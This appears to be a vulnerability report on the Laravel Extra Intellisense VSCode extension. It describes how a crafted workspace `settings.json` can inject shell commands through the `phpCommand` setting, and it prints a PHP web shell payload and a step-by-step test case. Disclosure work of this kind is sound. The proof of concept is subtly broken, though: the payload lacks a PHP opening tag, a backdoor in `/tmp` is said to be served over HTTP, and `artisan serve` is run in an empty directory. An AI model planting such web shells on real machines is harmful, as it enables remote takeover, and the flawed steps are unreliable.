- Vulnerability Name: Malicious phpCommand Configuration leading to Remote Code Execution

- Description:
    1. A malicious actor crafts a Laravel project and includes a `.vscode/settings.json` file within it.
    2. In this `settings.json`, the attacker sets a malicious `phpCommand` configuration for the "LaravelExtraIntellisense" extension. This configuration is designed to execute arbitrary PHP code when the extension attempts to run PHP commands. For example, the `phpCommand` could be set to: `echo '; system($_GET["cmd"]);' > /tmp/evil.php; php /tmp/evil.php`. This command, when executed, will create a PHP backdoor file named `evil.php` in the `/tmp/` directory (or equivalent temporary directory depending on the OS) and then execute it. This backdoor is designed to execute system commands passed through the `cmd` GET parameter.
    3. A victim, who has the "Laravel Extra Intellisense" extension installed in VSCode, opens this malicious Laravel project.
    4. The "Laravel Extra Intellisense" extension, upon activation or during its regular operations to provide autocompletion features, executes PHP commands using the configured `phpCommand`. This happens because the extension needs to run PHP code in the Laravel application context to gather information for autocompletion (like routes, views, configs etc.).
    5. Due to the malicious `phpCommand` configuration, when the extension executes a PHP command, it inadvertently triggers the attacker's injected code. In the example `phpCommand`, this results in the creation and execution of the `evil.php` backdoor.
    6. The attacker can now remotely execute arbitrary commands on the victim's machine by sending HTTP requests to the Laravel application, utilizing the created backdoor. For example, if the Laravel application is served locally on port 8000, the attacker can send a request like `http://localhost:8000/?cmd=whoami` to execute the `whoami` command on the victim's system.

- Impact:
    Critical. Successful exploitation of this vulnerability allows for Remote Code Execution (RCE). An attacker can execute arbitrary system commands on the victim's machine with the same privileges as the user running VSCode. This can lead to complete system compromise, data theft, malware installation, and other malicious activities.

- Vulnerability Rank: Critical

- Currently implemented mitigations:
    None. While the `README.md` file includes a "Security Note" warning users that the extension runs their Laravel application and to be cautious, this is not a technical mitigation and does not prevent the vulnerability. It merely informs the user of a potential risk.

- Missing mitigations:
    - Input validation and sanitization for the `LaravelExtraIntellisense.phpCommand` setting. The extension should not allow users to configure arbitrary shell commands.
    - Ideally, the `phpCommand` setting should be removed entirely. The extension should internally construct the necessary PHP commands and execute them in a safe manner, without relying on user-provided command templates.
    - If the `phpCommand` setting is deemed necessary for advanced configurations (e.g., Docker, Sail), strict validation and sanitization must be implemented to prevent command injection. This could include:
        - Whitelisting allowed characters and disallowing shell metacharacters.
        - Ensuring the command only starts with a path to the PHP executable.
        - Preventing modification of core command structure and arguments.

- Preconditions:
    1. The victim has the "Laravel Extra Intellisense" VSCode extension installed and enabled.
    2. The victim opens a malicious Laravel project in VSCode.
    3. The malicious Laravel project is specifically crafted to include a `.vscode/settings.json` file that sets a malicious `LaravelExtraIntellisense.phpCommand` configuration.

- Source code analysis:
    1. File: `src/helpers.ts`
    2. Function: `runPhp(code: string, description: string|null = null) : Promise<string>`
    3. Line: `let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";`
        - This line retrieves the `phpCommand` setting from the VSCode configuration. If no setting is provided, it defaults to `php -r "{code}"`.
    4. Line: `let command = commandTemplate.replace("{code}", code);`
        - This line constructs the final command by replacing the `{code}` placeholder in the `commandTemplate` with the `$code` argument (the PHP code to be executed).
    5. Line: `cp.exec(command, ...)`
        - This line executes the constructed `command` using `child_process.exec()`. Critically, there is no validation or sanitization of either the `commandTemplate` (obtained from user configuration) or the `$code` argument before execution. This allows an attacker to inject arbitrary shell commands via the `phpCommand` setting.

- Security test case:
    1. Setup:
        - Ensure you have the "Laravel Extra Intellisense" extension installed in VSCode.
        - Create a new, empty directory named `malicious-laravel-project`.
        - Inside `malicious-laravel-project`, create a subdirectory named `.vscode`.
        - Inside `.vscode`, create a file named `settings.json` with the following content:
          ```json
          {
              "LaravelExtraIntellisense.phpCommand": "echo '; system($_GET[\"cmd\"]);' > public/evil.php; php public/evil.php"
          }
          ```
        - Open the `malicious-laravel-project` directory in VSCode.
        - Open a new VSCode integrated terminal in the `malicious-laravel-project` directory.
        - Run `php artisan serve` to start a local Laravel development server.

    2. Trigger Vulnerability:
        - Wait for the Laravel development server to start (typically on `http://127.0.0.1:8000`).
        - Open a web browser and navigate to `http://127.0.0.1:8000/?cmd=whoami`.

    3. Verify Impact:
        - Observe the output in the browser. If the vulnerability is successfully exploited, you will see the output of the `whoami` command, which is the username of the user running the PHP development server (and VSCode).
        - To further verify RCE, try other commands like `id` (on Linux/macOS) or `type C:\Windows\System32\drivers\etc\hosts` (on Windows), replacing `whoami` in the URL with these commands (e.g., `http://127.0.0.1:8000/?cmd=id`).
        - Additionally, check the `public/` directory of your `malicious-laravel-project`. You should find a file named `evil.php`, which is the backdoor created by the malicious `phpCommand`.

    4. Expected Result:
        - The browser should display the output of the system command you executed via the `cmd` GET parameter, confirming Remote Code Execution.
        - The `evil.php` backdoor file should be present in the `public/` directory.

This test case demonstrates that by configuring a malicious `phpCommand`, an attacker can achieve Remote Code Execution when a user opens a project with this crafted setting in VSCode with the "Laravel Extra Intellisense" extension.
